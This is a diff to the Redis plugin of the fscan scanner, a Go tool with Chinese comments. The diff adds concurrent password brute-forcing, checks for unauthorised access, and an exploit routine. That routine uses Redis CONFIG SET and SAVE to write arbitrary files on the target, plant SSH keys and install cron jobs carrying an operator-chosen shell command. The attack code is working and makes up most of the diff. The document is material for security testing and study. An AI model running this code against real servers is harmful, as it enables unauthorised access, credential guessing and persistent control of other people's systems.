@@ -2,12 +2,15 @@ package Plugins
 
 import (
 	"bufio"
+	"context"
 	"fmt"
 	"github.com/shadow1ng/fscan/Common"
 	"io"
 	"net"
 	"os"
+	"path/filepath"
 	"strings"
+	"sync"
 	"time"
 )
 
@@ -16,29 +19,76 @@ var (
 	dir        string // Redis数据库目录
 )
 
+type RedisCredential struct {
+	Password string
+}
+
+type RedisScanResult struct {
+	Success    bool
+	IsUnauth   bool
+	Error      error
+	Credential RedisCredential
+}
+
 func RedisScan(info *Common.HostInfo) error {
 	Common.LogDebug(fmt.Sprintf("开始Redis扫描: %s:%v", info.Host, info.Ports))
-	starttime := time.Now().Unix()
+
+	// 设置全局超时上下文
+	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(Common.GlobalTimeout)*time.Second)
+	defer cancel()
+
+	target := fmt.Sprintf("%s:%v", info.Host, info.Ports)
 
 	// 先尝试无密码连接
-	flag, err := RedisUnauth(info)
-	if flag && err == nil {
-		Common.LogSuccess(fmt.Sprintf("Redis无密码连接成功: %s:%v", info.Host, info.Ports))
-
-		// 保存未授权访问结果
-		result := &Common.ScanResult{
-			Time:   time.Now(),
-			Type:   Common.VULN,
-			Target: info.Host,
-			Status: "vulnerable",
-			Details: map[string]interface{}{
-				"port":    info.Ports,
-				"service": "redis",
-				"type":    "unauthorized",
-			},
+	resultChan := make(chan *RedisScanResult, 1)
+	go func() {
+		flag, err := RedisUnauth(ctx, info)
+		if flag && err == nil {
+			resultChan <- &RedisScanResult{
+				Success:    true,
+				IsUnauth:   true,
+				Error:      nil,
+				Credential: RedisCredential{Password: ""},
+			}
+			return
 		}
-		Common.SaveResult(result)
-		return nil
+		resultChan <- nil
+	}()
+
+	// 等待无密码连接结果或超时
+	select {
+	case result := <-resultChan:
+		if result != nil && result.Success {
+			Common.LogSuccess(fmt.Sprintf("Redis无密码连接成功: %s", target))
+
+			// 保存未授权访问结果
+			scanResult := &Common.ScanResult{
+				Time:   time.Now(),
+				Type:   Common.VULN,
+				Target: info.Host,
+				Status: "vulnerable",
+				Details: map[string]interface{}{
+					"port":    info.Ports,
+					"service": "redis",
+					"type":    "unauthorized",
+				},
+			}
+			Common.SaveResult(scanResult)
+
+			// 如果配置了写入功能，进行漏洞利用
+			if Common.RedisFile != "" || Common.RedisShell != "" || (Common.RedisWritePath != "" && Common.RedisWriteContent != "") {
+				conn, err := Common.WrapperTcpWithTimeout("tcp", target, time.Duration(Common.Timeout)*time.Second)
+				if err == nil {
+					defer conn.Close()
+					ExploitRedis(ctx, info, conn, "")
+				}
+			}
+
+			return nil
+		}
+	case <-ctx.Done():
+		Common.LogError(fmt.Sprintf("Redis无密码连接测试超时: %s", target))
+		return fmt.Errorf("全局超时")
 	}
 
 	if Common.DisableBrute {
@@ -46,110 +96,279 @@ func RedisScan(info *Common.HostInfo) error {
 		return nil
 	}
 
-	// 遍历密码字典
-	for _, pass := range Common.Passwords {
-		// 检查是否超时
-		if time.Now().Unix()-starttime > int64(Common.Timeout) {
-			errMsg := fmt.Sprintf("Redis扫描超时: %s:%v", info.Host, info.Ports)
-			Common.LogError(errMsg)
-			return fmt.Errorf(errMsg)
+	// 使用密码爆破
+	credentials := generateRedisCredentials(Common.Passwords)
+	Common.LogDebug(fmt.Sprintf("开始尝试密码爆破 (总密码数: %d)", len(credentials)))
+
+	// 使用工作池并发扫描
+	result := concurrentRedisScan(ctx, info, credentials, Common.Timeout, Common.MaxRetries)
+	if result != nil {
+		// 记录成功结果
+		Common.LogSuccess(fmt.Sprintf("Redis认证成功 %s [%s]", target, result.Credential.Password))
+
+		// 保存弱密码结果
+		scanResult := &Common.ScanResult{
+			Time:   time.Now(),
+			Type:   Common.VULN,
+			Target: info.Host,
+			Status: "vulnerable",
+			Details: map[string]interface{}{
+				"port":     info.Ports,
+				"service":  "redis",
+				"type":     "weak-password",
+				"password": result.Credential.Password,
+			},
+		}
+		Common.SaveResult(scanResult)
+
+		// 如果配置了写入功能，进行漏洞利用
+		if Common.RedisFile != "" || Common.RedisShell != "" || (Common.RedisWritePath != "" && Common.RedisWriteContent != "") {
+			conn, err := Common.WrapperTcpWithTimeout("tcp", target, time.Duration(Common.Timeout)*time.Second)
+			if err == nil {
+				defer conn.Close()
+
+				// 认证
+				authCmd := fmt.Sprintf("auth %s\r\n", result.Credential.Password)
+				conn.Write([]byte(authCmd))
+				readreply(conn)
+
+				ExploitRedis(ctx, info, conn, result.Credential.Password)
+			}
 		}
 
-		pass = strings.Replace(pass, "{user}", "redis", -1)
-		Common.LogDebug(fmt.Sprintf("尝试密码: %s", pass))
+		return nil
+	}
 
-		var lastErr error
-		for retryCount := 0; retryCount < Common.MaxRetries; retryCount++ {
-			if retryCount > 0 {
-				Common.LogDebug(fmt.Sprintf("第 %d 次重试: %s", retryCount+1, pass))
+	// 检查是否因为全局超时
+	select {
+	case <-ctx.Done():
+		Common.LogError(fmt.Sprintf("Redis扫描全局超时: %s", target))
+		return fmt.Errorf("全局超时")
+	default:
+		Common.LogDebug(fmt.Sprintf("Redis扫描完成: %s", target))
+		return nil
+	}
+}
+
+// generateRedisCredentials 生成Redis密码列表
+func generateRedisCredentials(passwords []string) []RedisCredential {
+	var credentials []RedisCredential
+	for _, pass := range passwords {
+		actualPass := strings.Replace(pass, "{user}", "redis", -1)
+		credentials = append(credentials, RedisCredential{
+			Password: actualPass,
+		})
+	}
+	return credentials
+}
+
+// concurrentRedisScan 并发扫描Redis服务
+func concurrentRedisScan(ctx context.Context, info *Common.HostInfo, credentials []RedisCredential, timeoutMs int64, maxRetries int) *RedisScanResult {
+	// 使用ModuleThreadNum控制并发数
+	maxConcurrent := Common.ModuleThreadNum
+	if maxConcurrent <= 0 {
+		maxConcurrent = 10 // 默认值
+	}
+	if maxConcurrent > len(credentials) {
+		maxConcurrent = len(credentials)
+	}
+
+	// 创建工作池
+	var wg sync.WaitGroup
+	resultChan := make(chan *RedisScanResult, 1)
+	workChan := make(chan RedisCredential, maxConcurrent)
+	scanCtx, scanCancel := context.WithCancel(ctx)
+	defer scanCancel()
+
+	// 启动工作协程
+	for i := 0; i < maxConcurrent; i++ {
+		wg.Add(1)
+		go func() {
+			defer wg.Done()
+			for credential := range workChan {
+				select {
+				case <-scanCtx.Done():
+					return
+				default:
+					result := tryRedisCredential(scanCtx, info, credential, timeoutMs, maxRetries)
+					if result.Success {
+						select {
+						case resultChan <- result:
+							scanCancel() // 找到有效凭据，取消其他工作
+						default:
+						}
+						return
+					}
+				}
 			}
+		}()
+	}
 
-			done := make(chan struct {
-				success bool
-				err     error
-			})
-
-			go func() {
-				success, err := RedisConn(info, pass)
-				done <- struct {
-					success bool
-					err     error
-				}{success, err}
-			}()
-
-			var connErr error
+	// 发送工作
+	go func() {
+		for i, cred := range credentials {
 			select {
-			case result := <-done:
-				if result.success {
-					Common.LogSuccess(fmt.Sprintf("Redis登录成功 %s:%v [%s]",
-						info.Host, info.Ports, pass))
-
-					// 保存弱密码结果
-					vulnResult := &Common.ScanResult{
-						Time:   time.Now(),
-						Type:   Common.VULN,
-						Target: info.Host,
-						Status: "vulnerable",
-						Details: map[string]interface{}{
-							"port":     info.Ports,
-							"service":  "redis",
-							"type":     "weak-password",
-							"password": pass,
-						},
-					}
-					Common.SaveResult(vulnResult)
-					return nil
-				}
-				connErr = result.err
-			case <-time.After(time.Duration(Common.Timeout) * time.Second):
-				connErr = fmt.Errorf("连接超时")
+			case <-scanCtx.Done():
+				break
+			default:
+				Common.LogDebug(fmt.Sprintf("[%d/%d] 尝试密码: %s", i+1, len(credentials), cred.Password))
+				workChan <- cred
 			}
-
-			if connErr != nil {
-				lastErr = connErr
-				errMsg := fmt.Sprintf("Redis尝试失败 %s:%v [%s] %v",
-					info.Host, info.Ports, pass, connErr)
-				Common.LogError(errMsg)
-
-				if retryErr := Common.CheckErrs(connErr); retryErr != nil {
-					if retryCount == Common.MaxRetries-1 {
-						Common.LogDebug(fmt.Sprintf("达到最大重试次数: %s", pass))
-						break
-					}
-					continue
-				}
-			}
-			break
 		}
+		close(workChan)
+	}()
 
-		if lastErr != nil && Common.CheckErrs(lastErr) != nil {
-			Common.LogDebug(fmt.Sprintf("Redis扫描中断: %v", lastErr))
-			return lastErr
+	// 等待结果或完成
+	go func() {
+		wg.Wait()
+		close(resultChan)
+	}()
+
+	// 获取结果，考虑全局超时
+	select {
+	case result, ok := <-resultChan:
+		if ok && result != nil && result.Success {
+			return result
+		}
+		return nil
+	case <-ctx.Done():
+		Common.LogDebug("Redis并发扫描全局超时")
+		scanCancel() // 确保取消所有未完成工作
+		return nil
+	}
+}
+
+// tryRedisCredential 尝试单个Redis凭据
+func tryRedisCredential(ctx context.Context, info *Common.HostInfo, credential RedisCredential, timeoutMs int64, maxRetries int) *RedisScanResult {
+	var lastErr error
+
+	for retry := 0; retry < maxRetries; retry++ {
+		select {
+		case <-ctx.Done():
+			return &RedisScanResult{
+				Success:    false,
+				Error:      fmt.Errorf("全局超时"),
+				Credential: credential,
+			}
+		default:
+			if retry > 0 {
+				Common.LogDebug(fmt.Sprintf("第%d次重试密码: %s", retry+1, credential.Password))
+				time.Sleep(500 * time.Millisecond) // 重试前等待
+			}
+
+			success, err := attemptRedisAuth(ctx, info, credential.Password, timeoutMs)
+			if success {
+				return &RedisScanResult{
+					Success:    true,
+					Credential: credential,
+				}
+			}
+
+			lastErr = err
+			if err != nil {
+				// 检查是否需要重试
+				if retryErr := Common.CheckErrs(err); retryErr == nil {
+					break // 不需要重试的错误
+				}
+			}
 		}
 	}
 
-	Common.LogDebug(fmt.Sprintf("Redis扫描完成: %s:%v", info.Host, info.Ports))
-	return nil
+	return &RedisScanResult{
+		Success:    false,
+		Error:      lastErr,
+		Credential: credential,
+	}
+}
+
+// attemptRedisAuth 尝试Redis认证
+func attemptRedisAuth(ctx context.Context, info *Common.HostInfo, password string, timeoutMs int64) (bool, error) {
+	// 创建独立于全局超时的单个连接超时上下文
+	connCtx, cancel := context.WithTimeout(context.Background(), time.Duration(timeoutMs)*time.Millisecond)
+	defer cancel()
+
+	// 结合全局上下文和连接超时上下文
+	mergedCtx, mergedCancel := context.WithCancel(connCtx)
+	defer mergedCancel()
+
+	// 监听全局上下文取消
+	go func() {
+		select {
+		case <-ctx.Done():
+			mergedCancel() // 全局超时会触发合并上下文取消
+		case <-connCtx.Done():
+			// 连接超时已经触发，无需操作
+		}
+	}()
+
+	connChan := make(chan struct {
+		success bool
+		err     error
+	}, 1)
+
+	go func() {
+		success, err := RedisConn(info, password)
+		select {
+		case <-mergedCtx.Done():
+		case connChan <- struct {
+			success bool
+			err     error
+		}{success, err}:
+		}
+	}()
+
+	select {
+	case result := <-connChan:
+		return result.success, result.err
+	case <-mergedCtx.Done():
+		if ctx.Err() != nil {
+			return false, fmt.Errorf("全局超时")
+		}
+		return false, fmt.Errorf("连接超时")
+	}
 }
 
 // RedisUnauth 尝试Redis未授权访问检测
-func RedisUnauth(info *Common.HostInfo) (flag bool, err error) {
+func RedisUnauth(ctx context.Context, info *Common.HostInfo) (flag bool, err error) {
 	realhost := fmt.Sprintf("%s:%v", info.Host, info.Ports)
 	Common.LogDebug(fmt.Sprintf("开始Redis未授权检测: %s", realhost))
 
-	// 建立TCP连接
-	conn, err := Common.WrapperTcpWithTimeout("tcp", realhost, time.Duration(Common.Timeout)*time.Second)
-	if err != nil {
-		Common.LogError(fmt.Sprintf("Redis连接失败 %s: %v", realhost, err))
-		return false, err
-	}
-	defer conn.Close()
+	// 创建带超时的连接
+	connCtx, cancel := context.WithTimeout(ctx, time.Duration(Common.Timeout)*time.Second)
+	defer cancel()
 
-	// 设置读取超时
-	if err = conn.SetReadDeadline(time.Now().Add(time.Duration(Common.Timeout) * time.Second)); err != nil {
-		Common.LogError(fmt.Sprintf("Redis %s 设置超时失败: %v", realhost, err))
-		return false, err
+	connChan := make(chan struct {
+		conn net.Conn
+		err  error
+	}, 1)
+
+	go func() {
+		conn, err := Common.WrapperTcpWithTimeout("tcp", realhost, time.Duration(Common.Timeout)*time.Second)
+		select {
+		case <-connCtx.Done():
+			if conn != nil {
+				conn.Close()
+			}
+		case connChan <- struct {
+			conn net.Conn
+			err  error
+		}{conn, err}:
+		}
+	}()
+
+	var conn net.Conn
+	select {
+	case result := <-connChan:
+		if result.err != nil {
+			Common.LogError(fmt.Sprintf("Redis连接失败 %s: %v", realhost, result.err))
+			return false, result.err
+		}
+		conn = result.conn
+	case <-connCtx.Done():
+		return false, fmt.Errorf("连接超时")
 	}
+
+	defer conn.Close()
 
 	// 发送info命令测试未授权访问
 	Common.LogDebug(fmt.Sprintf("发送info命令到: %s", realhost))
@@ -174,7 +393,7 @@ func RedisUnauth(info *Common.HostInfo) (flag bool, err error) {
 
 	// 发现未授权访问，获取配置
 	Common.LogDebug(fmt.Sprintf("Redis %s 发现未授权访问，尝试获取配置", realhost))
-	dbfilename, dir, err := getconfig(conn)
+	dbfilename, dir, err = getconfig(conn)
 	if err != nil {
 		result := fmt.Sprintf("Redis %s 发现未授权访问", realhost)
 		Common.LogSuccess(result)
@@ -184,13 +403,6 @@ func RedisUnauth(info *Common.HostInfo) (flag bool, err error) {
 	// 输出详细信息
 	result := fmt.Sprintf("Redis %s 发现未授权访问 文件位置:%s/%s", realhost, dir, dbfilename)
 	Common.LogSuccess(result)
-
-	// 尝试漏洞利用
-	Common.LogDebug(fmt.Sprintf("尝试Redis %s 漏洞利用", realhost))
-	if err = Expoilt(realhost, conn); err != nil {
-		Common.LogError(fmt.Sprintf("Redis %s 漏洞利用失败: %v", realhost, err))
-	}
-
 	return true, nil
 }
 
@@ -245,22 +457,16 @@ func RedisConn(info *Common.HostInfo, pass string) (bool, error) {
 		result := fmt.Sprintf("Redis认证成功 %s [%s] 文件位置:%s/%s",
 			realhost, pass, dir, dbfilename)
 		Common.LogSuccess(result)
-
-		// 尝试利用
-		Common.LogDebug("尝试Redis利用")
-		err = Expoilt(realhost, conn)
-		if err != nil {
-			Common.LogDebug(fmt.Sprintf("利用失败: %v", err))
-		}
-		return true, err
+		return true, nil
 	}
 
 	Common.LogDebug("认证失败")
-	return false, err
+	return false, fmt.Errorf("认证失败")
 }
 
-// Expoilt 尝试Redis漏洞利用
-func Expoilt(realhost string, conn net.Conn) error {
+// ExploitRedis 执行Redis漏洞利用
+func ExploitRedis(ctx context.Context, info *Common.HostInfo, conn net.Conn, password string) error {
+	realhost := fmt.Sprintf("%s:%v", info.Host, info.Ports)
 	Common.LogDebug(fmt.Sprintf("开始Redis漏洞利用: %s", realhost))
 
 	// 如果配置为不进行测试则直接返回
@@ -269,62 +475,92 @@ func Expoilt(realhost string, conn net.Conn) error {
 		return nil
 	}
 
-	// 测试目录写入权限
-	Common.LogDebug("测试目录写入权限")
-	flagSsh, flagCron, err := testwrite(conn)
-	if err != nil {
-		Common.LogError(fmt.Sprintf("Redis %v 测试写入权限失败: %v", realhost, err))
-		return err
+	// 获取当前配置
+	var err error
+	if dbfilename == "" || dir == "" {
+		dbfilename, dir, err = getconfig(conn)
+		if err != nil {
+			Common.LogError(fmt.Sprintf("获取Redis配置失败: %v", err))
+			return err
+		}
 	}
 
-	// SSH密钥写入测试
-	if flagSsh {
-		Common.LogSuccess(fmt.Sprintf("Redis %v 可写入路径 /root/.ssh/", realhost))
-
-		// 如果指定了密钥文件则尝试写入
-		if Common.RedisFile != "" {
-			Common.LogDebug(fmt.Sprintf("尝试写入SSH密钥: %s", Common.RedisFile))
-			writeok, text, err := writekey(conn, Common.RedisFile)
-			if err != nil {
-				Common.LogError(fmt.Sprintf("Redis %v SSH密钥写入错误: %v %v", realhost, text, err))
-				return err
-			}
-
-			if writeok {
-				Common.LogSuccess(fmt.Sprintf("Redis %v SSH公钥写入成功", realhost))
-			} else {
-				Common.LogError(fmt.Sprintf("Redis %v SSH公钥写入失败: %v", realhost, text))
-			}
-		} else {
-			Common.LogDebug("未指定SSH密钥文件，跳过写入")
-		}
-	} else {
-		Common.LogDebug("SSH目录不可写")
+	// 检查是否超时
+	select {
+	case <-ctx.Done():
+		return fmt.Errorf("全局超时")
+	default:
 	}
 
-	// 定时任务写入测试
-	if flagCron {
-		Common.LogSuccess(fmt.Sprintf("Redis %v 可写入路径 /var/spool/cron/", realhost))
+	// 支持任意文件写入
+	if Common.RedisWritePath != "" && Common.RedisWriteContent != "" {
+		Common.LogDebug(fmt.Sprintf("尝试写入文件: %s", Common.RedisWritePath))
 
-		// 如果指定了shell命令则尝试写入定时任务
-		if Common.RedisShell != "" {
-			Common.LogDebug(fmt.Sprintf("尝试写入定时任务: %s", Common.RedisShell))
-			writeok, text, err := writecron(conn, Common.RedisShell)
-			if err != nil {
-				Common.LogError(fmt.Sprintf("Redis %v 定时任务写入错误: %v", realhost, err))
-				return err
-			}
+		// 提取目录和文件名
+		filePath := Common.RedisWritePath
+		dirPath := filepath.Dir(filePath)
+		fileName := filepath.Base(filePath)
 
-			if writeok {
-				Common.LogSuccess(fmt.Sprintf("Redis %v 成功写入 /var/spool/cron/root", realhost))
-			} else {
-				Common.LogError(fmt.Sprintf("Redis %v 定时任务写入失败: %v", realhost, text))
-			}
+		Common.LogDebug(fmt.Sprintf("目标目录: %s, 文件名: %s", dirPath, fileName))
+
+		success, msg, err := writeCustomFile(conn, dirPath, fileName, Common.RedisWriteContent)
+		if err != nil {
+			Common.LogError(fmt.Sprintf("文件写入失败: %v", err))
+		} else if success {
+			Common.LogSuccess(fmt.Sprintf("成功写入文件: %s", filePath))
 		} else {
-			Common.LogDebug("未指定shell命令，跳过写入定时任务")
+			Common.LogError(fmt.Sprintf("文件写入失败: %s", msg))
 		}
-	} else {
-		Common.LogDebug("Cron目录不可写")
+	}
+
+	// 支持从本地文件读取并写入
+	if Common.RedisWritePath != "" && Common.RedisWriteFile != "" {
+		Common.LogDebug(fmt.Sprintf("尝试从文件 %s 读取内容并写入到 %s", Common.RedisWriteFile, Common.RedisWritePath))
+
+		// 读取本地文件内容
+		fileContent, err := os.ReadFile(Common.RedisWriteFile)
+		if err != nil {
+			Common.LogError(fmt.Sprintf("读取本地文件失败: %v", err))
+		} else {
+			// 提取目录和文件名
+			dirPath := filepath.Dir(Common.RedisWritePath)
+			fileName := filepath.Base(Common.RedisWritePath)
+
+			success, msg, err := writeCustomFile(conn, dirPath, fileName, string(fileContent))
+			if err != nil {
+				Common.LogError(fmt.Sprintf("文件写入失败: %v", err))
+			} else if success {
+				Common.LogSuccess(fmt.Sprintf("成功将文件 %s 的内容写入到 %s", Common.RedisWriteFile, Common.RedisWritePath))
+			} else {
+				Common.LogError(fmt.Sprintf("文件写入失败: %s", msg))
+			}
+		}
+	}
+
+	// 支持向SSH目录写入密钥（向后兼容）
+	if Common.RedisFile != "" {
+		Common.LogDebug(fmt.Sprintf("尝试写入SSH密钥: %s", Common.RedisFile))
+		success, msg, err := writekey(conn, Common.RedisFile)
+		if err != nil {
+			Common.LogError(fmt.Sprintf("SSH密钥写入失败: %v", err))
+		} else if success {
+			Common.LogSuccess(fmt.Sprintf("SSH密钥写入成功"))
+		} else {
+			Common.LogError(fmt.Sprintf("SSH密钥写入失败: %s", msg))
+		}
+	}
+
+	// 支持写入定时任务（向后兼容）
+	if Common.RedisShell != "" {
+		Common.LogDebug(fmt.Sprintf("尝试写入定时任务: %s", Common.RedisShell))
+		success, msg, err := writecron(conn, Common.RedisShell)
+		if err != nil {
+			Common.LogError(fmt.Sprintf("定时任务写入失败: %v", err))
+		} else if success {
+			Common.LogSuccess(fmt.Sprintf("定时任务写入成功"))
+		} else {
+			Common.LogError(fmt.Sprintf("定时任务写入失败: %s", msg))
+		}
 	}
 
 	// 恢复数据库配置
@@ -336,7 +572,79 @@ func Expoilt(realhost string, conn net.Conn) error {
 	}
 
 	Common.LogDebug(fmt.Sprintf("Redis漏洞利用完成: %s", realhost))
-	return err
+	return nil
+}
+
+// writeCustomFile 向指定路径写入自定义内容
+func writeCustomFile(conn net.Conn, dirPath, fileName, content string) (flag bool, text string, err error) {
+	Common.LogDebug(fmt.Sprintf("开始向 %s/%s 写入内容", dirPath, fileName))
+	flag = false
+
+	// 设置文件目录
+	Common.LogDebug(fmt.Sprintf("设置目录: %s", dirPath))
+	if _, err = conn.Write([]byte(fmt.Sprintf("CONFIG SET dir %s\r\n", dirPath))); err != nil {
+		Common.LogDebug(fmt.Sprintf("设置目录失败: %v", err))
+		return flag, text, err
+	}
+	if text, err = readreply(conn); err != nil {
+		Common.LogDebug(fmt.Sprintf("读取响应失败: %v", err))
+		return flag, text, err
+	}
+
+	// 设置文件名
+	if strings.Contains(text, "OK") {
+		Common.LogDebug(fmt.Sprintf("设置文件名: %s", fileName))
+		if _, err = conn.Write([]byte(fmt.Sprintf("CONFIG SET dbfilename %s\r\n", fileName))); err != nil {
+			Common.LogDebug(fmt.Sprintf("设置文件名失败: %v", err))
+			return flag, text, err
+		}
+		if text, err = readreply(conn); err != nil {
+			Common.LogDebug(fmt.Sprintf("读取响应失败: %v", err))
+			return flag, text, err
+		}
+
+		// 写入内容
+		if strings.Contains(text, "OK") {
+			Common.LogDebug("写入文件内容")
+			// 处理多行内容，添加换行符
+			safeContent := strings.ReplaceAll(content, "\"", "\\\"")
+			safeContent = strings.ReplaceAll(safeContent, "\n", "\\n")
+
+			if _, err = conn.Write([]byte(fmt.Sprintf("set x \"%s\"\r\n", safeContent))); err != nil {
+				Common.LogDebug(fmt.Sprintf("写入内容失败: %v", err))
+				return flag, text, err
+			}
+			if text, err = readreply(conn); err != nil {
+				Common.LogDebug(fmt.Sprintf("读取响应失败: %v", err))
+				return flag, text, err
+			}
+
+			// 保存更改
+			if strings.Contains(text, "OK") {
+				Common.LogDebug("保存更改")
+				if _, err = conn.Write([]byte("save\r\n")); err != nil {
+					Common.LogDebug(fmt.Sprintf("保存失败: %v", err))
+					return flag, text, err
+				}
+				if text, err = readreply(conn); err != nil {
+					Common.LogDebug(fmt.Sprintf("读取响应失败: %v", err))
+					return flag, text, err
+				}
+				if strings.Contains(text, "OK") {
+					Common.LogDebug("文件写入成功")
+					flag = true
+				}
+			}
+		}
+	}
+
+	// 截断过长的响应文本
+	text = strings.TrimSpace(text)
+	if len(text) > 50 {
+		text = text[:50]
+	}
+	Common.LogDebug(fmt.Sprintf("写入文件完成, 状态: %v, 响应: %s", flag, text))
+	return flag, text, err
 }
 
 // writekey 向Redis写入SSH密钥
@@ -555,52 +863,6 @@ func readreply(conn net.Conn) (string, error) {
 		Common.LogDebug("未收到响应数据")
 	}
 	return string(bytes), err
-}
-
-// testwrite 测试Redis写入权限
-func testwrite(conn net.Conn) (flag bool, flagCron bool, err error) {
-	Common.LogDebug("开始测试Redis写入权限")
-
-	// 测试SSH目录写入权限
-	Common.LogDebug("测试 /root/.ssh/ 目录写入权限")
-	if _, err = conn.Write([]byte("CONFIG SET dir /root/.ssh/\r\n")); err != nil {
-		Common.LogDebug(fmt.Sprintf("发送SSH目录测试命令失败: %v", err))
-		return flag, flagCron, err
-	}
-	text, err := readreply(conn)
-	if err != nil {
-		Common.LogDebug(fmt.Sprintf("读取SSH目录测试响应失败: %v", err))
-		return flag, flagCron, err
-	}
-	Common.LogDebug(fmt.Sprintf("SSH目录测试响应: %s", text))
-	if strings.Contains(text, "OK") {
-		flag = true
-		Common.LogDebug("SSH目录可写")
-	} else {
-		Common.LogDebug("SSH目录不可写")
-	}
-
-	// 测试定时任务目录写入权限
-	Common.LogDebug("测试 /var/spool/cron/ 目录写入权限")
-	if _, err = conn.Write([]byte("CONFIG SET dir /var/spool/cron/\r\n")); err != nil {
-		Common.LogDebug(fmt.Sprintf("发送定时任务目录测试命令失败: %v", err))
-		return flag, flagCron, err
-	}
-	text, err = readreply(conn)
-	if err != nil {
-		Common.LogDebug(fmt.Sprintf("读取定时任务目录测试响应失败: %v", err))
-		return flag, flagCron, err
-	}
-	Common.LogDebug(fmt.Sprintf("定时任务目录测试响应: %s", text))
-	if strings.Contains(text, "OK") {
-		flagCron = true
-		Common.LogDebug("定时任务目录可写")
-	} else {
-		Common.LogDebug("定时任务目录不可写")
-	}
-
-	Common.LogDebug(fmt.Sprintf("写入权限测试完成 - SSH权限: %v, Cron权限: %v", flag, flagCron))
-	return flag, flagCron, err
 }
 
 // getconfig 获取Redis配置信息
